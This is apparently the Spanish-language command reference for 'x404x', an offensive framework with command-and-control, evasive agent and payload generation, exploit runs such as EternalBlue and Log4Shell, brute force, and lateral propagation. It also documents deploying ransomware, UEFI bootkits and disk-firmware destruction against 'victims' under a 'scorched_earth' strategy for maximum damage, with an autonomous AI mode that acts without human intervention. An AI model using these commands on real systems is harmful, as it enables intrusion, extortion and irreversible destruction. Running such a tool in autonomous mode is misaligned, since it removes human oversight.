# X404X — Referencia CLI Completa

> Todos los comandos disponibles en el binario `x404x` con sintaxis, flags, y ejemplos.
> Versión: 3.0 · Build: Go 1.25

---

## Sintaxis General

```
x404x [comando] [subcomando] [flags]
```

Flags globales disponibles en todos los comandos:

| Flag | Descripción |
|------|-------------|
| `--config <path>` | Ruta al archivo de configuración (default: `config.yaml`) |
| `--verbose` / `-v` | Salida detallada |
| `--json` | Salida en formato JSON |
| `--quiet` / `-q` | Suprimir salida no esencial |
| `--help` / `-h` | Mostrar ayuda del comando |

---

## Campaign — Gestión de Campañas

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `campaign start` | `x404x campaign start --name <n> --target <ip/cidr> --goal <g> --profile <p> [--auto]` | Inicia una nueva campaña de Red Team |
| `campaign status` | `x404x campaign status [--json]` | Estado de la campaña activa |
| `campaign list` | `x404x campaign list [--status active\|completed]` | Lista todas las campañas |
| `campaign pause` | `x404x campaign pause <campaign_id>` | Pausa una campaña activa |
| `campaign resume` | `x404x campaign resume <campaign_id>` | Reanuda campaña pausada |
| `campaign report` | `x404x campaign report <campaign_id> [--format json\|markdown\|pdf]` | Genera reporte de campaña |
| `campaign delete` | `x404x campaign delete <campaign_id>` | Elimina campaña y sus datos |

### Flags de `campaign start`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--name` | Sí | String | Nombre identificador de la campaña |
| `--target` / `-t` | Sí | IP o CIDR | Rango de IPs objetivo |
| `--goal` / `-g` | Sí | `domain_admin`, `exfil_encrypt`, `persistence`, `destruction` | Objetivo final |
| `--profile` / `-p` | Sí | `stealth`, `balanced`, `aggressive` | Perfil de velocidad/ruido |
| `--auto` | No | Boolean | Modo autónomo (IA decide sin intervención) |
| `--modules` | No | Lista CSV | Módulos específicos a usar |
| `--timeout` | No | Duración (e.g. `2h`) | Tiempo máximo de campaña |

### Ejemplos

```bash
# Campaña agresiva con cifrado
x404x campaign start --name operacion-cobra --target 192.168.1.0/24 --goal exfil_encrypt --profile aggressive --auto

# Campaña sigilosa para obtener domain admin
x404x campaign start --name silent-night --target 10.0.0.0/16 --goal domain_admin --profile stealth

# Ver estado
x404x campaign status

# Ver estado en JSON (para scripting)
x404x campaign status --json

# Listar solo campañas activas
x404x campaign list --status active

# Pausar campaña
x404x campaign pause operacion-cobra

# Reanudar
x404x campaign resume operacion-cobra

# Generar reporte PDF
x404x campaign report operacion-cobra --format pdf
```

---

## Recon — Reconocimiento

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `recon scan` | `x404x recon scan --target <ip/cidr> [--ports <range>] [--stealth]` | Escaneo TCP/UDP de puertos |
| `recon osint` | `x404x recon osint --domain <d> [--github] [--shodan]` | Recolección OSINT pasiva |
| `recon dns` | `x404x recon dns --domain <d> [--bruteforce]` | Enumeración DNS |
| `recon vuln` | `x404x recon vuln --target <ip> [--service all]` | Escaneo de vulnerabilidades |

### Flags de `recon scan`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--target` / `-t` | Sí | IP o CIDR | Objetivo del escaneo |
| `--ports` / `-p` | No | Rango (e.g. `1-65535`, `1-1000`) | Puertos a escanear (default: top 1000) |
| `--stealth` | No | Boolean | Modo sigiloso (SYN scan, timing lento) |
| `--udp` | No | Boolean | Incluir escaneo UDP |
| `--service` | No | Boolean | Detección de versión de servicios |
| `--os` | No | Boolean | Fingerprinting de SO |

### Ejemplos

```bash
# Escaneo rápido
x404x recon scan --target 10.0.0.0/24

# Escaneo completo con detección de servicios
x404x recon scan --target 10.0.0.5 --ports 1-65535 --service

# Escaneo sigiloso
x404x recon scan --target 192.168.1.0/24 --stealth

# OSINT de dominio
x404x recon osint --domain target.com --github --shodan

# Enumeración DNS con bruteforce de subdominios
x404x recon dns --domain target.com --bruteforce

# Escaneo de vulnerabilidades
x404x recon vuln --target 10.0.0.5 --service all
```

---

## Agent — Gestión de Agentes

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `agent list` | `x404x agent list [--campaign <id>] [--status online\|dead]` | Lista agentes registrados |
| `agent interact` | `x404x agent interact <agent_id>` | Shell interactiva con agente |
| `agent generate` | `x404x agent generate --os <os> --arch <arch> --c2 <addr> [--stealth]` | Genera binario de agente |
| `agent tasks` | `x404x agent tasks <agent_id> [--list] [--add <cmd>]` | Gestión de tareas del agente |
| `agent kill` | `x404x agent kill <agent_id> [--reason <r>]` | Elimina agente remoto |

### Flags de `agent generate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--os` | Sí | `windows`, `linux`, `darwin` | Sistema operativo objetivo |
| `--arch` | Sí | `amd64`, `arm64` | Arquitectura del procesador |
| `--c2` | Sí | `host:port` | Dirección del servidor C2 |
| `--stealth` | No | Boolean | Aplicar técnicas de evasión básicas |
| `--name` | No | String | Nombre personalizado del binario |
| `--heartbeat` | No | Duración (e.g. `30s`) | Intervalo de heartbeat |

### Ejemplos

```bash
# Listar todos los agentes online
x404x agent list --status online

# Listar agentes de una campaña específica
x404x agent list --campaign operacion-cobra

# Generar agente Windows con evasión
x404x agent generate --os windows --arch amd64 --c2 10.0.0.1:8443 --stealth

# Interactuar con agente
x404x agent interact agent-7f3a

# Asignar tarea
x404x agent tasks agent-7f3a --add "whoami && ipconfig /all"

# Eliminar agente
x404x agent kill agent-7f3a --reason "detected by EDR"
```

---

## Exploit — Explotación

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `exploit scan` | `x404x exploit scan --target <ip> [--risk safe\|medium\|high]` | Escanea vectores de explotación |
| `exploit run` | `x404x exploit run --target <ip> --cve <cve> [--risk <level>]` | Ejecuta exploit específico |
| `exploit cve` | `x404x exploit cve <CVE-ID> --target <ip>` | Ejecuta exploit por CVE |
| `exploit bruteforce` | `x404x exploit bruteforce <service> <target>` | Fuerza bruta contra servicio |

### Flags de `exploit run`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--target` / `-t` | Sí | IP | Host objetivo |
| `--cve` | Sí | CVE-YYYY-NNNNN | Identificador CVE |
| `--risk` | No | `safe`, `medium`, `high` | Nivel de riesgo aceptable |
| `--payload` | No | String | Payload personalizado |
| `--check` | No | Boolean | Solo verificar vulnerabilidad sin explotar |

### Ejemplos

```bash
# Escanear vectores de explotación
x404x exploit scan --target 10.0.0.5

# Ejecutar EternalBlue
x404x exploit run --target 10.0.0.5 --cve CVE-2017-0144

# Ejecutar Log4Shell
x404x exploit cve CVE-2021-44228 --target 10.0.0.22

# Fuerza bruta SSH
x404x exploit bruteforce ssh 10.0.0.5

# Solo verificar sin explotar
x404x exploit run --target 10.0.0.5 --cve CVE-2020-1472 --check
```

---

## AI — Asistente de Inteligencia Artificial

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `ai chat` | `x404x ai chat <prompt>` | Conversación con Specter (LLM) |
| `ai suggest` | `x404x ai suggest [--campaign <id>]` | Sugerencias tácticas de la IA |
| `ai auto` | `x404x ai auto [on\|off]` | Activar/desactivar modo autónomo |
| `ai analyze` | `x404x ai analyze <target_data>` | Análisis contextual de objetivo |
| `ai model` | `x404x ai model [list\|set <model>]` | Gestión de modelos LLM |

### Flags de `ai suggest`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--campaign` | No | ID | Campaña para contextualizar sugerencias |
| `--context` | No | String | Contexto adicional |
| `--max-tokens` | No | Número | Límite de tokens en respuesta |

### Ejemplos

```bash
# Chat interactivo con Specter
x404x ai chat "¿Cuál es el mejor vector de ataque para un servidor Apache 2.4.49?"

# Obtener sugerencias para campaña activa
x404x ai suggest --campaign operacion-cobra

# Activar modo autónomo
x404x ai auto on

# Desactivar modo autónomo
x404x ai auto off

# Analizar datos de target
x404x ai analyze "Windows Server 2019, SMB 445 open, no patches since 2022"

# Listar modelos disponibles
x404x ai model list

# Cambiar modelo
x404x ai model set llama3.2
```

---

## Lateral — Movimiento Lateral

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `lateral scan` | `x404x lateral scan --subnet <cidr>` | Descubre hosts alcanzables desde posición actual |
| `lateral propagate` | `x404x lateral propagate --subnet <cidr> --method <m>` | Propaga agente a hosts adyacentes |
| `lateral relay` | `x404x lateral relay [--add <ip:port>] [--chain]` | Configura cadena de relays |

### Flags de `lateral propagate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--subnet` | Sí | CIDR | Subred para propagación |
| `--method` / `-m` | Sí | `smb`, `ssh`, `wmi`, `psexec`, `rdp` | Método de propagación |
| `--target` | No | IP | Host específico (en lugar de toda la subred) |
| `--creds` | No | `user:pass` | Credenciales a utilizar |
| `--stealth` | No | Boolean | Propagación sigilosa (más lenta) |

### Ejemplos

```bash
# Escanear subred para movimiento lateral
x404x lateral scan --subnet 10.0.0.0/24

# Propagar via SMB
x404x lateral propagate --subnet 10.0.0.0/24 --method smb

# Propagar via SSH a host específico
x404x lateral propagate --target 10.0.0.15 --method ssh --creds root:toor

# Crear cadena de relay
x404x lateral relay --add 10.0.0.5:4444 --chain
```

---

## Payload — Generador de Payloads

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `payload generate` | `x404x payload generate --os <os> --arch <arch> --c2 <addr> [--stealth --evasion <level> --output <path>]` | Genera payload ejecutable |
| `payload list` | `x404x payload list` | Lista payloads generados |
| `payload obfuscate` | `x404x payload obfuscate --input <path> --method <m> [--packer upx]` | Ofusca payload existente |
| `payload info` | `x404x payload info` | Información del payload actual |

### Flags de `payload generate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--os` | Sí | `windows`, `linux`, `darwin` | SO objetivo |
| `--arch` | Sí | `amd64`, `arm64` | Arquitectura |
| `--c2` | Sí | `host:port` | Servidor C2 |
| `--stealth` | No | Boolean | Evasión básica |
| `--evasion` | No | `none`, `basic`, `stealth`, `paranoid` | Nivel de evasión |
| `--output` / `-o` | No | Path | Ruta de salida (default: `dist/`) |
| `--name` | No | String | Nombre del binario |
| `--format` | No | `exe`, `dll`, `shellcode`, `elf`, `macho` | Formato de salida |

### Flags de `payload obfuscate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--input` / `-i` | Sí | Path | Archivo a ofuscar |
| `--method` / `-m` | Sí | `polymorphic`, `xor`, `aes` | Método de ofuscación |
| `--packer` | No | `upx`, `custom` | Packer a aplicar |
| `--key` | No | String | Clave para XOR/AES (autogenerada si se omite) |
| `--output` / `-o` | No | Path | Ruta de salida |

### Ejemplos

```bash
# Generar payload Windows con evasión stealth
x404x payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --evasion stealth

# Generar payload Linux ARM64
x404x payload generate --os linux --arch arm64 --c2 10.0.0.1:8443 --output /tmp/agent

# Generar shellcode
x404x payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --format shellcode

# Listar payloads
x404x payload list

# Ofuscar payload existente con polimorfismo + UPX
x404x payload obfuscate --input dist/agent-windows-amd64.exe --method polymorphic --packer upx

# Ofuscar con AES
x404x payload obfuscate --input dist/agent-linux-amd64 --method aes --key "my-secret-key"

# Info del payload actual
x404x payload info
```

---

## Listeners — Gestión de Listeners

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `listeners list` | `x404x listeners list` | Lista todos los listeners |
| `listeners add` | `x404x listeners add --type <t> --port <p> [--host <h>]` | Añade nuevo listener |
| `listeners remove` | `x404x listeners remove <id>` | Elimina listener |
| `listeners start` | `x404x listeners start <id>` | Inicia listener detenido |
| `listeners stop` | `x404x listeners stop <id>` | Detiene listener activo |

### Flags de `listeners add`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--type` / `-t` | Sí | `tcp`, `http`, `https`, `dns`, `icmp`, `smb`, `ws`, `doh` | Protocolo del listener |
| `--port` / `-p` | Sí | Número | Puerto de escucha |
| `--host` / `-h` | No | IP | Interfaz de escucha (default: `0.0.0.0`) |
| `--name` | No | String | Nombre descriptivo |
| `--tls-cert` | No | Path | Certificado TLS (para https) |
| `--tls-key` | No | Path | Clave TLS (para https) |

### Tipos de Listener

| Tipo | Puerto Default | Descripción |
|------|---------------|-------------|
| `tcp` | 4444 | TCP raw — conexión directa |
| `http` | 80 | HTTP — tráfico web normal |
| `https` | 443 | HTTPS — tráfico cifrado web |
| `dns` | 53 | DNS — túnel en consultas DNS |
| `icmp` | N/A | ICMP — túnel en pings |
| `smb` | 445 | SMB — tráfico de archivos Windows |
| `ws` | 8446 | WebSocket — bidireccional |
| `doh` | 443 | DNS over HTTPS — máxima evasión |

### Ejemplos

```bash
# Listar listeners
x404x listeners list

# Añadir listener HTTPS
x404x listeners add --type https --port 443 --host 0.0.0.0

# Añadir listener DNS para evasión
x404x listeners add --type dns --port 53 --name "dns-tunnel"

# Añadir listener DoH
x404x listeners add --type doh --port 443 --name "doh-covert"

# Iniciar listener
x404x listeners start listener-1

# Detener listener
x404x listeners stop listener-1

# Eliminar listener
x404x listeners remove listener-1
```

---

## Dashboard — Control del Dashboard Web

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `dashboard` | `x404x dashboard [--port <p>] [--dev]` | Inicia dashboard web |
| `dashboard start` | `x404x dashboard start [--port <p>] [--dev]` | Alias de `dashboard` |
| `dashboard stop` | `x404x dashboard stop` | Detiene dashboard |
| `dashboard status` | `x404x dashboard status` | Estado del dashboard |

### Flags

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--port` / `-p` | No | Número | Puerto (default: 3000) |
| `--dev` | No | Boolean | Modo desarrollo (hot-reload) |
| `--no-browser` | No | Boolean | No abrir navegador automáticamente |

### Ejemplos

```bash
# Iniciar dashboard
x404x dashboard

# Iniciar en puerto custom
x404x dashboard --port 8080

# Modo desarrollo
x404x dashboard --dev

# Ver estado
x404x dashboard status

# Detener
x404x dashboard stop
```

---

## DB — Gestión de Base de Datos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `db status` | `x404x db status` | Estado de la base de datos |
| `db migrate` | `x404x db migrate [--up\|--down]` | Ejecutar migraciones |
| `db backup` | `x404x db backup [--output <path>]` | Crear backup |
| `db restore` | `x404x db restore <path>` | Restaurar desde backup |

### Ejemplos

```bash
# Estado de la DB
x404x db status

# Migrar hacia arriba
x404x db migrate --up

# Rollback
x404x db migrate --down

# Backup
x404x db backup --output backups/x404x-$(date +%Y%m%d).db

# Restaurar
x404x db restore backups/x404x-20240101.db
```

---

## Lab — Entorno de Laboratorio

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `lab up` | `x404x lab up [--scenario <name>]` | Levantar laboratorio Docker |
| `lab down` | `x404x lab down` | Detener laboratorio |
| `lab status` | `x404x lab status` | Estado de contenedores |
| `lab scenario` | `x404x lab scenario [list\|load <name>]` | Gestión de escenarios |

### Escenarios Disponibles

| Escenario | Descripción |
|-----------|-------------|
| `ctf_basic` | CTF básico con 5 targets vulnerables |
| `ad_environment` | Simulación Active Directory completa |
| `webapp_pentest` | Aplicaciones web vulnerables (OWASP Top 10) |
| `full_chain` | Ejercicio kill chain completo (7 fases) |

### Ejemplos

```bash
# Levantar lab default
x404x lab up

# Levantar escenario específico
x404x lab up --scenario ad_environment

# Ver estado
x404x lab status

# Listar escenarios
x404x lab scenario list

# Cargar escenario diferente (sin reiniciar)
x404x lab scenario load webapp_pentest

# Detener lab
x404x lab down
```

---

## Deploy — Despliegue de Módulos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `deploy` | `x404x deploy <victim> [modules...] --strategy <s>` | Despliega módulos en víctima |

### Flags

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `<victim>` | Sí | ID de agente | Víctima objetivo |
| `[modules...]` | Sí | Lista CSV | Módulos a desplegar |
| `--strategy` / `-s` | Sí | `stealth`, `targeted`, `scorched_earth` | Estrategia de despliegue |
| `--delay` | No | Duración | Retraso entre módulos |
| `--confirm` | No | Boolean | Confirmar antes de ejecutar |

### Estrategias

| Estrategia | Descripción |
|------------|-------------|
| `stealth` | Ejecución lenta, mínima huella, prioriza evasión |
| `targeted` | Balance entre velocidad y sigilo, módulos selectivos |
| `scorched_earth` | Ejecución inmediata de todos los módulos, máximo daño |

### Ejemplos

```bash
# Desplegar ransomware + evasión genética en modo sigiloso
x404x deploy victim01 ransomware/worm,blockz/genetic_evolve --strategy stealth

# Desplegar bootkit + kill en modo scorched_earth
x404x deploy victim02 v27/uefi_bootkit,v29/hdd_firmware_destroy --strategy scorched_earth

# Desplegar con confirmación
x404x deploy victim01 v210/apocalipsis --strategy scorched_earth --confirm
```

---

## Modules — Catálogo de Módulos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `modules list` | `x404x modules list [category]` | Lista módulos (opcionalmente por categoría) |
| `modules categories` | `x404x modules categories` | Lista categorías disponibles |
| `modules info` | `x404x modules info <module>` | Información detallada de un módulo |

### Categorías

| Categoría | Cantidad | Descripción |
|-----------|----------|-------------|
| `exploit` | 16 | Exploits y escalación de privilegios |
| `auxiliary` | 3 | Escáneres y herramientas auxiliares |
| `post` | 2 | Post-explotación y persistencia |
| `ransomware` | 16 | Módulos ransomware avanzados |
| `blockz` | 14 | Block Z — El Umbral de la Perdición |
| `v26` | 15 | POMDPs + IA + Evasión + Cloud |
| `v27` | 10 | Control total + Phishing |
| `v28` | 24 | Arsenal Ultimate |
| `v29` | 27 | Destrucción hardware + Stealth |
| `v210` | 2 | Endgame |
| `v3` | 5 | Orchestrator v3 + Platform Core |
| `omega` | 7 | Omega — Ataques de persistencia extrema |

### Ejemplos

```bash
# Listar todos los módulos
x404x modules list

# Listar solo ransomware
x404x modules list ransomware

# Listar categorías
x404x modules categories

# Info de módulo específico
x404x modules info blockz/genetic_evolve
```

---

## Victims — Gestión de Víctimas

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `victims list` | `x404x victims list` | Lista víctimas registradas |

### Ejemplo

```bash
x404x victims list
```

Salida:

```
  ID          Hostname        OS              IP              Status      Modules
  victim01    DESKTOP-ABC     Windows 10      10.0.0.15       active      3
  victim02    srv-web-01      Ubuntu 22.04    10.0.0.22       active      1
  victim03    dc01            Windows Server  10.0.0.1        dormant     5
```

---

## C2 — Comando y Control

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `c2 listen` | `x404x c2 listen` | Inicia servidor C2 en modo listen-only |

### Ejemplo

```bash
# Iniciar C2 en modo escucha
x404x c2 listen
```

Inicia el servidor gRPC en el puerto configurado (`server.grpc_port: 8444`) y acepta conexiones de agentes sin iniciar campañas.

---

## Console — Shell Interactiva

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `console` | `x404x console` | Inicia shell interactiva tipo msfconsole |

### Ejemplo

```bash
./x404x console
```

Dentro de la consola se accede a todos los módulos con sintaxis `use`, `set`, `exploit`.

---

## Utilidades

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `version` | `x404x version` | Muestra versión del framework |
| `help` | `x404x help [command]` | Ayuda general o de comando específico |

### Ejemplos

```bash
x404x version
# X404X v3.0.0 (build 2024-01-15, go1.25, 154 modules)

x404x help campaign
# Muestra ayuda detallada del comando campaign
```

---

## Tabla de Referencia Rápida — Todos los Comandos

| Comando Completo | Descripción Corta |
|------------------|-------------------|
| `x404x campaign start --name <n> --target <ip> --goal <g> --profile <p> [--auto]` | Iniciar campaña |
| `x404x campaign status` | Estado campaña |
| `x404x campaign list` | Listar campañas |
| `x404x campaign pause <id>` | Pausar campaña |
| `x404x campaign resume <id>` | Reanudar campaña |
| `x404x campaign report <id> [--format]` | Reporte |
| `x404x campaign delete <id>` | Eliminar campaña |
| `x404x recon scan --target <ip>` | Escaneo de red |
| `x404x recon osint --domain <d>` | OSINT pasivo |
| `x404x recon dns --domain <d>` | Enumeración DNS |
| `x404x recon vuln --target <ip>` | Escaneo vulns |
| `x404x agent list` | Listar agentes |
| `x404x agent interact <id>` | Interactuar agente |
| `x404x agent generate --os <os> --arch <arch> --c2 <addr>` | Generar agente |
| `x404x agent tasks <id>` | Tareas de agente |
| `x404x agent kill <id>` | Eliminar agente |
| `x404x exploit scan --target <ip>` | Escanear exploits |
| `x404x exploit run --target <ip> --cve <cve>` | Ejecutar exploit |
| `x404x exploit cve <CVE> --target <ip>` | Exploit por CVE |
| `x404x exploit bruteforce <service> <target>` | Fuerza bruta |
| `x404x ai chat <prompt>` | Chat IA |
| `x404x ai suggest [--campaign <id>]` | Sugerencias IA |
| `x404x ai auto [on\|off]` | Modo autónomo |
| `x404x ai analyze <data>` | Análisis IA |
| `x404x ai model [list\|set]` | Gestión modelos |
| `x404x lateral scan --subnet <cidr>` | Escaneo lateral |
| `x404x lateral propagate --subnet <cidr> --method <m>` | Propagación |
| `x404x lateral relay --add <ip:port>` | Cadena relay |
| `x404x payload generate --os <os> --arch <arch> --c2 <addr>` | Generar payload |
| `x404x payload list` | Listar payloads |
| `x404x payload obfuscate --input <path> --method <m>` | Ofuscar payload |
| `x404x payload info` | Info payload |
| `x404x listeners list` | Listar listeners |
| `x404x listeners add --type <t> --port <p>` | Añadir listener |
| `x404x listeners remove <id>` | Eliminar listener |
| `x404x listeners start <id>` | Iniciar listener |
| `x404x listeners stop <id>` | Detener listener |
| `x404x dashboard` | Iniciar dashboard |
| `x404x dashboard stop` | Detener dashboard |
| `x404x dashboard status` | Estado dashboard |
| `x404x db status` | Estado DB |
| `x404x db migrate` | Migraciones |
| `x404x db backup` | Backup DB |
| `x404x db restore <path>` | Restaurar DB |
| `x404x lab up` | Levantar lab |
| `x404x lab down` | Detener lab |
| `x404x lab status` | Estado lab |
| `x404x lab scenario [list\|load]` | Escenarios |
| `x404x deploy <victim> [modules] --strategy <s>` | Desplegar módulos |
| `x404x modules list [category]` | Listar módulos |
| `x404x modules categories` | Categorías |
| `x404x victims list` | Listar víctimas |
| `x404x c2 listen` | Servidor C2 |
| `x404x console` | Shell interactiva |
| `x404x version` | Versión |
| `x404x help` | Ayuda |

---

## Estado de Implementación

La siguiente tabla indica qué comandos están **completamente funcionales** y cuáles están en fase de **stub** (interfaz definida, lógica pendiente).

| Comando | Estado | Notas |
|---------|--------|-------|
| `x404x campaign start` | **FUNCIONAL** | Orquestador v3 con POMDP |
| `x404x campaign status` | **FUNCIONAL** | Query a DB SQLite |
| `x404x campaign list` | **FUNCIONAL** | Query a DB |
| `x404x campaign pause` | **FUNCIONAL** | Señal al orquestador |
| `x404x campaign resume` | **FUNCIONAL** | Señal al orquestador |
| `x404x campaign report` | STUB | Generación de reportes pendiente |
| `x404x campaign delete` | STUB | Solo marca como eliminada |
| `x404x recon scan` | **FUNCIONAL** | Scanner TCP integrado en Go |
| `x404x recon osint` | **FUNCIONAL** | Módulo Python via bridge |
| `x404x recon dns` | **FUNCIONAL** | Enumeración DNS nativa |
| `x404x recon vuln` | STUB | Depende de integración CVE DB |
| `x404x agent list` | **FUNCIONAL** | gRPC AgentService |
| `x404x agent interact` | **FUNCIONAL** | Shell bidireccional via gRPC stream |
| `x404x agent generate` | **FUNCIONAL** | Cross-compile Go + evasión |
| `x404x agent tasks` | **FUNCIONAL** | Cola de tareas gRPC |
| `x404x agent kill` | **FUNCIONAL** | Señal de terminación al agente |
| `x404x exploit scan` | **FUNCIONAL** | Scanner de vectores locales |
| `x404x exploit run` | **FUNCIONAL** | Ejecución de exploits registrados |
| `x404x exploit cve` | PARCIAL | Solo CVEs con módulo implementado |
| `x404x exploit bruteforce` | **FUNCIONAL** | SSH, SMB, RDP, FTP |
| `x404x ai chat` | **FUNCIONAL** | Ollama integration |
| `x404x ai suggest` | **FUNCIONAL** | Contexto de campaña + LLM |
| `x404x ai auto` | **FUNCIONAL** | Toggle modo autónomo |
| `x404x ai analyze` | STUB | Análisis básico implementado |
| `x404x ai model` | **FUNCIONAL** | List/set modelos Ollama |
| `x404x lateral scan` | **FUNCIONAL** | ARP + ICMP + TCP discovery |
| `x404x lateral propagate` | **FUNCIONAL** | SMB, SSH, WMI |
| `x404x lateral relay` | STUB | Relay chain en desarrollo |
| `x404x payload generate` | **FUNCIONAL** | Cross-compile + evasión multi-nivel |
| `x404x payload list` | **FUNCIONAL** | Lista desde dist/ |
| `x404x payload obfuscate` | **FUNCIONAL** | XOR, AES, polimorfismo, UPX |
| `x404x payload info` | STUB | Metadata básica |
| `x404x listeners list` | **FUNCIONAL** | Lista listeners registrados |
| `x404x listeners add` | **FUNCIONAL** | TCP, HTTP, HTTPS, DNS, WS |
| `x404x listeners remove` | **FUNCIONAL** | Elimina y libera puerto |
| `x404x listeners start` | **FUNCIONAL** | Inicia goroutine de listener |
| `x404x listeners stop` | **FUNCIONAL** | Graceful shutdown |
| `x404x dashboard` | **FUNCIONAL** | API Go + Vue3 frontend |
| `x404x dashboard stop` | **FUNCIONAL** | Signal SIGTERM |
| `x404x dashboard status` | **FUNCIONAL** | Health check |
| `x404x db status` | **FUNCIONAL** | SQLite ping + stats |
| `x404x db migrate` | **FUNCIONAL** | Auto-migrate GORM |
| `x404x db backup` | **FUNCIONAL** | Copia fichero SQLite |
| `x404x db restore` | **FUNCIONAL** | Reemplaza fichero DB |
| `x404x lab up` | **FUNCIONAL** | docker compose up |
| `x404x lab down` | **FUNCIONAL** | docker compose down |
| `x404x lab status` | **FUNCIONAL** | docker compose ps |
| `x404x lab scenario` | PARCIAL | Solo `ctf_basic` y `full_chain` disponibles |
| `x404x deploy` | **FUNCIONAL** | Dispatch a agentes via gRPC |
| `x404x modules list` | **FUNCIONAL** | Registry dinámico |
| `x404x modules categories` | **FUNCIONAL** | Categorías del registry |
| `x404x victims list` | **FUNCIONAL** | Query DB de víctimas |
| `x404x c2 listen` | **FUNCIONAL** | gRPC server standalone |
| `x404x console` | **FUNCIONAL** | REPL con readline + autocompletado |
| `x404x version` | **FUNCIONAL** | Build info embebida |
| `x404x help` | **FUNCIONAL** | Cobra help system |

### Resumen

| Estado | Cantidad | Porcentaje |
|--------|----------|------------|
| **FUNCIONAL** | 44 | 85% |
| **PARCIAL** | 2 | 4% |
| **STUB** | 6 | 11% |

---

## Variables de Entorno

| Variable | Descripción | Default |
|----------|-------------|---------|
| `X404X_CONFIG` | Ruta al archivo de configuración | `./config.yaml` |
| `X404X_LOG_LEVEL` | Nivel de logging (`debug`, `info`, `warn`, `error`) | `info` |
| `X404X_C2_HOST` | Override del host C2 | Config file |
| `X404X_C2_PORT` | Override del puerto C2 | `8443` |
| `X404X_DB_PATH` | Ruta a la base de datos SQLite | `./x404x.db` |
| `X404X_OLLAMA_HOST` | Host de Ollama para IA | `localhost` |
| `X404X_OLLAMA_PORT` | Puerto de Ollama | `11434` |
| `X404X_LAB_NETWORK` | Red Docker para lab | `x404x-lab` |
| `X404X_KILL_SWITCH` | Código del kill switch | Config file |
| `X404X_NO_COLOR` | Deshabilitar colores en output | `false` |

---

## Códigos de Salida

| Código | Significado |
|--------|-------------|
| `0` | Éxito |
| `1` | Error general |
| `2` | Error de argumentos/flags inválidos |
| `3` | Error de conexión (C2, DB, Ollama) |
| `4` | Error de permisos |
| `5` | Kill switch activado |
| `10` | Campaña fallida |
| `11` | Agente no encontrado |
| `12` | Módulo no encontrado |
| `99` | Error interno no recuperable |
